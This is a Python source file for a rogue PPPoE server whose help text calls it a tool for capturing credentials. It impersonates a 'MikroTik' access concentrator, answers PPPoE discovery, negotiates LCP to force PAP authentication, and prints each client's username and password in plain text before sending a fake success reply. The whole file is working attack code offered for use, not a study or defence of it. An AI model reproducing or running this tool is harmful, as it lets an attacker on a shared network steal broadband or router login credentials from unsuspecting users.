import argparse
import socket
import struct
import random
import time
import sys
from collections import defaultdict
from os import urandom

# Ethernet & PPPoE Constants
ETH_PPPOE_DISC = 0x8863  # PPPoE Discovery
ETH_PPPOE_SESS = 0x8864  # PPPoE Session
PPPOE_VER_TYPE = 0x11    # Version 1, Type 1

# PPPoE Codes
PPPOE_CODE_PADI = 0x09   # Initiation
PPPOE_CODE_PADO = 0x07   # Offer
PPPOE_CODE_PADR = 0x19   # Request
PPPOE_CODE_PADS = 0x65   # Session Confirmation
PPPOE_CODE_PADT = 0xA7   # Termination

# PPP Protocol Numbers
PPP_LCP = 0xC021         # Link Control Protocol
PPP_PAP = 0xC023         # Password Authentication Protocol
PPP_IPCP = 0x8021        # IP Control Protocol

# LCP Codes

LCP_CONF_REQ = 1         # Configuration Request
LCP_CONF_ACK = 2         # Configuration Acknowledge
LCP_CONF_NAK = 3         # Configuration Reject
LCP_TERM_REQ = 5         # Termination Request
LCP_OPT_MRU = 1          # Maximum Receive Unit
LCP_OPT_AUTH = 2         # Authentication Protocol
LCP_OPT_MAGIC = 3        # Magic Number
LCP_ECHO_REQ = 9         # Echo-Request
LCP_ECHO_REPLY = 10


# PAP Codes
PAP_AUTH_REQ = 1         # Authentication Request
PAP_AUTH_ACK = 2         # Acknowledge
PAP_AUTH_NAK = 3         # Negative Acknowledge

# Server Config
SERVER_NAME = b"MikroTik"  # Server name

def parse_args():
    parser = argparse.ArgumentParser(
        description="PPPoE Server for Capturing Credentials",
        epilog="Run this script with root privileges (sudo) to capture PPPoE credentials.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface",
        default="eth0",
        help="Network interface to listen on"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    return parser.parse_args()

class PPPoEServer:
    def __init__(self, interface):
        self.sock = None
        self.interface = interface
        self.sessions = {}  # Track active sessions
        self.mac = self.get_interface_mac()
        self.host_uniq_tags = defaultdict(dict)
        self.magic_number = int.from_bytes(urandom(4), byteorder='big')

    def get_interface_mac(self):
        """Get MAC address of the interface."""
        try:
            with open(f"/sys/class/net/{self.interface}/address") as f:
                mac = f.read().strip()
            return bytes.fromhex(mac.replace(":", ""))
        except FileNotFoundError:
            print(f"\033[91m[-]\033[0m Error: Interface {self.interface} not found.")

    def start(self):
        """Start the PPPoE server."""
        try:
            self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            self.sock.bind((self.interface, 0))
            print(f"\033[92m[+]\033[0m PPPoE Server running on {self.interface} (MAC: {self.mac.hex(':')})")
            print("\033[92m[+]\033[0m Waiting for PPPoE clients...")
            self.listen()
        except PermissionError:
            print("\033[91m[-]\033[0m Error: Must run as root (sudo required)")
        except Exception as e:
            print(f"\033[91m[-]\033[0m Error: {e}")

    def listen(self):
        """Main packet processing loop."""
        while True:
            try:
                packet, _ = self.sock.recvfrom(65535)
                self.process_packet(packet)
            except KeyboardInterrupt:
                print("\n\033[94m[!]\033[0m Server stopped by user.")
                break
            except Exception as e:
                print(f"\033[91m[-]\033[0m Error processing packet: {e}")

    def process_packet(self, packet):
        """Process incoming PPPoE packets."""
        if len(packet) < 14:
            return

        # Parse Ethernet header
        eth_header = packet[:14]
        dst_mac = eth_header[:6]
        src_mac = eth_header[6:12]
        eth_type = struct.unpack("!H", eth_header[12:14])[0]
        payload = packet[14:]

        # Handle PPPoE Discovery (PADI, PADR)
        if eth_type == ETH_PPPOE_DISC:
            if len(payload) < 6:
                return

            ver_type, code, session_id, length = struct.unpack("!BBHH", payload[:6])
            if ver_type != PPPOE_VER_TYPE:
                return

            tags = self.parse_tags(payload[6:6+length])

            if code == PPPOE_CODE_PADI:
                self.handle_padi(src_mac, tags)
            elif code == PPPOE_CODE_PADR:
                self.handle_padr(src_mac, tags)

        # Handle PPPoE Session (PAP Authentication, LCP)
        elif eth_type == ETH_PPPOE_SESS:
            if len(payload) < 6:
                return

            ver_type, code, session_id, length = struct.unpack("!BBHH", payload[:6])
            if ver_type != PPPOE_VER_TYPE or code != 0x00:
                return

            if session_id in self.sessions:
                ppp_payload = payload[6:6+length]
                if len(ppp_payload) >= 2:
                    ppp_proto = struct.unpack("!H", ppp_payload[:2])[0]
                    if ppp_proto == PPP_PAP:
                        self.handle_pap(session_id, ppp_payload[2:], src_mac)
                    elif ppp_proto == PPP_LCP:
                        self.handle_lcp(session_id, ppp_payload[2:], src_mac)

    def parse_tags(self, data):
        """Parse PPPoE tags (Service-Name, Host-Uniq, etc.)."""
        tags = {}
        pos = 0
        while pos + 4 <= len(data):
            tag_type, tag_len = struct.unpack("!HH", data[pos:pos+4])
            tag_value = data[pos+4:pos+4+tag_len]
            tags[tag_type] = tag_value
            pos += 4 + tag_len
        return tags

    def handle_padi(self, src_mac, tags):
        """Respond to PADI (PPPoE Active Discovery Initiation)."""
        if args.verbose:
            print(f"\033[92m[+]\033[0m Received PADI from {src_mac.hex(':')}")

        # Check for Host-Uniq tag (used to match PADI-PADO-PADR)
        host_uniq = tags.get(0x0103, None)

        # Build PADO (Offer) response
        tag_data = (
            struct.pack("!HH", 0x0101, len(SERVER_NAME)) + SERVER_NAME +  # Service-Name
            struct.pack("!HH", 0x0102, len(SERVER_NAME)) + SERVER_NAME    # AC-Name
        )

        if host_uniq:
            tag_data += struct.pack("!HH", 0x0103, len(host_uniq)) + host_uniq

        # Build PPPoE header
        pppoe_header = struct.pack("!BBHH", PPPOE_VER_TYPE, PPPOE_CODE_PADO, 0, len(tag_data))
        pppoe_packet = pppoe_header + tag_data

        # Build Ethernet frame
        eth_frame = (
            src_mac +                    # Destination MAC (client)
            self.mac +                   # Source MAC (server)
            struct.pack("!H", ETH_PPPOE_DISC) +  # EtherType
            pppoe_packet
        )

        self.sock.send(eth_frame)

        if args.verbose:
            print(f"\033[92m[+]\033[0m Sent PADO to {src_mac.hex(':')}")

    def handle_padr(self, src_mac, tags):
        """Handle PADR (Request)."""
        if args.verbose:
            print(f"\033[92m[+]\033[0m Received PADR from {src_mac.hex(':')}")

        # Generate session ID
        session_id = random.randint(1, 65535)
        while session_id in self.sessions:
            session_id = random.randint(1, 65535)

        # Store session
        self.sessions[session_id] = {
            "client_mac": src_mac,
            "start_time": time.time(),
            "host_uniq": tags.get(0x0103, None)
        }

        # Build PADS with Service-Name tag
        service_name = tags.get(0x0101, b"")
        tag_data = struct.pack("!HH", 0x0101, len(service_name)) + service_name if service_name else b""

        # Add Host-Uniq if provided
        host_uniq = tags.get(0x0103, None)
        if host_uniq:
            tag_data += struct.pack("!HH", 0x0103, len(host_uniq)) + host_uniq

        # Send PADS
        pppoe_header = struct.pack("!BBHH", PPPOE_VER_TYPE, PPPOE_CODE_PADS, session_id, len(tag_data))
        eth_frame = (
            src_mac + self.mac +
            struct.pack("!H", ETH_PPPOE_DISC) +
            pppoe_header + tag_data
        )
        self.sock.send(eth_frame)
        if args.verbose:
            print(f"\033[92m[+]\033[0m Sent PADS (Session ID: {session_id})")


    def send_lcp_conf_req(self, session_id, dst_mac):
        """Send LCP Configuration Request with Magic Number."""
        # LCP options:
        # 1. MRU (Maximum Receive Unit)
        # 2. Authentication Protocol (PAP)
        # 3. Magic Number
        lcp_options = (
            struct.pack("!BBH", 1, 4, 1492) +      # MRU option (type=1, len=4, value=1492)
            struct.pack("!BBH", 3, 4, 0xC023) +    # Auth Protocol option (type=3, len=4, value=PAP)
            struct.pack("!BBI", 5, 6, self.magic_number)  # Magic Number (type=5, len=6, value=4 bytes)
        )

        # Build LCP Configuration Request packet
        # Code=1 (Configure-Request), Identifier=1, Length=4 + options
        lcp_packet = struct.pack("!BBH", LCP_CONF_REQ, 1, 4 + len(lcp_options)) + lcp_options

        # Build PPP frame (protocol=0xC021 for LCP)
        ppp_frame = struct.pack("!H", PPP_LCP) + lcp_packet

        # Build PPPoE frame
        pppoe_header = struct.pack("!BBHH", PPPOE_VER_TYPE, 0x00, session_id, len(ppp_frame))
        pppoe_packet = pppoe_header + ppp_frame

        # Build Ethernet frame
        eth_frame = (
            dst_mac +                    # Destination MAC (client)
            self.mac +                   # Source MAC (server)
            struct.pack("!H", ETH_PPPOE_SESS) +  # EtherType (0x8864)
            pppoe_packet
        )

        self.sock.send(eth_frame)
        if args.verbose:
            print(f"\033[92m[+]\033[0m Sent LCP Configuration-Request (Session: {session_id})")

    def handle_lcp(self, session_id, lcp_data, src_mac):
        """Handle LCP packets with full option parsing."""
        if len(lcp_data) < 4:
            print("\033[91m[-]\033[0m Malformed LCP packet (too short)")
            return

        # Unpack LCP header (code, identifier, length)
        code, identifier, length = struct.unpack("!BBH", lcp_data[:4])
        options = lcp_data[4:length] if length > 4 else b''

        if code == LCP_CONF_REQ:
            if args.verbose:
                print(f"\033[92m[+]\033[0m Received LCP Configuration-Request (ID: {identifier}, Session: {session_id})")

            # Parse all LCP options
            pos = 0
            while pos < len(options):
                try:
                    opt_type, opt_len = struct.unpack("!BB", options[pos:pos+2])
                    if opt_len < 2 or (pos + opt_len) > len(options):
                        print(f"\033[91m[-]\033[0m Invalid option length {opt_len} at position {pos}")
                        break
                    
                    opt_data = options[pos+2:pos+opt_len]
                    
                    # Process specific option types
                    if opt_type == LCP_OPT_MRU:
                        mru = struct.unpack("!H", opt_data[:2])[0]
                        if args.verbose:
                            print(f"    MRU: {mru} bytes")

                    elif opt_type == LCP_OPT_AUTH:
                        auth_proto = struct.unpack("!H", opt_data[:2])[0]
                        proto_name = "PAP" if auth_proto == 0xC023 else "CHAP" if auth_proto == 0xC223 else f"Unknown (0x{auth_proto:04x})"
                        if args.verbose:
                            print(f"    Authentication Protocol: {proto_name}")

                    elif opt_type == LCP_OPT_MAGIC:
                        magic = struct.unpack("!I", opt_data[:4])[0]
                        # Store magic number for session
                        if session_id not in self.sessions:
                            self.sessions[session_id] = {}
                        self.sessions[session_id]['peer_magic'] = magic
                    
                    pos += opt_len
                    
                except struct.error as e:
                    print(f"\033[91m[-]\033[0m Failed to unpack option at position {pos}: {e}")
                    break

            # Send Configuration-Ack with original options
            self.send_lcp_conf_ack(session_id, identifier, options, src_mac)

            self.send_lcp_conf_req(session_id, src_mac)

        elif code == LCP_CONF_ACK:
            if args.verbose:
                print(f"\033[92m[+]\033[0m Received LCP Configuration-Ack (ID: {identifier}, Session: {session_id})")

        elif code == LCP_CONF_NAK:
            if args.verbose:
                print(f"\033[92m[+]\033[0m Received LCP Configuration-Nak (ID: {identifier}, Session: {session_id})")
            # Handle NAK (typically resend config with adjusted parameters)
        elif code == LCP_ECHO_REQ:
            if args.verbose:
                print(f"\033[92m[+]\033[0m Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
            # Respond with Echo-Reply
            self.send_lcp_echo_reply(session_id, identifier, src_mac)

        # elif code == LCP_CONF_REJ:
        #     print(f"\033[92m[+]\033[0m Received LCP Configuration-Reject (ID: {identifier}, Session: {session_id})")
        #     # Handle rejected options

        # elif code == LCP_ECHO_REQ:
        #     print(f"\033[92m[+]\033[0m Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
        #     self.send_lcp_echo_reply(session_id, identifier, options, src_mac)

        else:
            if args.verbose:
                print(f"\033[91m[-]\033[0m Unknown LCP code {code} (Session: {session_id})")

    def send_lcp_conf_ack(self, session_id, identifier, options, dst_mac):
        """Send LCP Configuration-Acknowledgment packet.
        
        Args:
            session_id: PPPoE session ID
            identifier: LCP packet identifier (must match Request)
            options: Original options from Configuration-Request
            dst_mac: Destination MAC address
        """
        # Build LCP Configuration-Ack header (code, id, length)
        # Length = header (4 bytes) + options
        length = 4 + len(options)
        lcp_header = struct.pack("!BBH", LCP_CONF_ACK, identifier, length)
        
        # The ACK must echo back the exact same options as received in Request
        lcp_packet = lcp_header + options
        
        # Build PPP frame (protocol 0xC021 for LCP)
        ppp_frame = struct.pack("!H", PPP_LCP) + lcp_packet
        
        # Build PPPoE header
        pppoe_header = struct.pack("!BBHH", 
                                PPPOE_VER_TYPE,  # ver_type
                                0x00,           # code (session data)
                                session_id,     # session ID
                                len(ppp_frame)) # length
        
        # Build complete Ethernet frame
        eth_frame = (
            dst_mac +                   # Destination MAC (client)
            self.mac +                  # Source MAC (server)
            struct.pack("!H", ETH_PPPOE_SESS) +  # EtherType
            pppoe_header +              # PPPoE header
            ppp_frame                   # PPP/LCP payload
        )
        
        # Send packet
        self.sock.send(eth_frame)
        
        # Debug output
        if args.verbose and session_id in self.sessions:
            print(f"\033[92m[+]\033[0m Sent LCP Config-Ack (ID: {identifier}, Session: {session_id})")

    def send_lcp_echo_reply(self, session_id, identifier, dst_mac):
        """Send LCP Echo-Reply packet.

        Args:
            session_id: PPPoE session ID
            identifier: LCP packet identifier (must match Request)
            dst_mac: Destination MAC address
        """
        # Build LCP Echo-Reply header (code, id, length)
        lcp_header = struct.pack("!BBH", LCP_ECHO_REPLY, identifier, 8)

        # Build PPP frame (protocol 0xC021 for LCP)
        ppp_frame = struct.pack("!H", PPP_LCP) + lcp_header + struct.pack("!I", self.magic_number)

        # Build PPPoE header
        pppoe_header = struct.pack("!BBHH",
                                    PPPOE_VER_TYPE,  # ver_type
                                    0x00,           # code (session data)
                                    session_id,     # session ID
                                    len(ppp_frame)) # length

        # Build complete Ethernet frame
        eth_frame = (
            dst_mac +                   # Destination MAC (client)
            self.mac +                  # Source MAC (server)
            struct.pack("!H", ETH_PPPOE_SESS) +  # EtherType
            pppoe_header +              # PPPoE header
            ppp_frame                   # PPP/LCP payload
        )

        # Send packet
        self.sock.send(eth_frame)
        if args.verbose:
            print("\033[92m[+]\033[0m Sent LCP Echo-Reply")

    def handle_pap(self, session_id, pap_data, src_mac):
        """Handle PAP authentication."""
        try:
            code, id, length = struct.unpack("!BBH", pap_data[:4])
            if code == PAP_AUTH_REQ:
                peer_id_len = pap_data[4]
                peer_id = pap_data[5:5+peer_id_len].decode("ascii", errors="ignore")
                passwd_len = pap_data[5+peer_id_len]
                password = pap_data[6+peer_id_len:6+peer_id_len+passwd_len].decode("ascii", errors="ignore")

                print("\n\033[94m[!] \033[1mCaptured PPPoE Credentials:\033[0m")
                print(f"    \033[1;33mUsername:   \033[0;32m{peer_id}\033[0m")
                print(f"    \033[1;33mPassword:   \033[0;32m{password}\033[0m\n")

                # Send ACK
                msg = b"Authentication successful"
                response = struct.pack("!BBH", PAP_AUTH_ACK, id, 5 + len(msg)) + struct.pack("B", len(msg)) + msg
                ppp_frame = struct.pack("!H", PPP_PAP) + response
                
                pppoe_header = struct.pack("!BBHH", PPPOE_VER_TYPE, 0x00, session_id, len(ppp_frame))
                eth_frame = (
                    src_mac + self.mac +
                    struct.pack("!H", ETH_PPPOE_SESS) +
                    pppoe_header + ppp_frame
                )
                
                self.sock.send(eth_frame)
                if args.verbose:
                    print("\033[92m[+]\033[0m Sent PAP ACK")
                sys.exit(0)

        except Exception as e:
            print(f"\033[91m[-]\033[0m Error parsing PAP: {e}")

if __name__ == "__main__":
    args = parse_args()
    server = PPPoEServer(args.interface)
    server.start()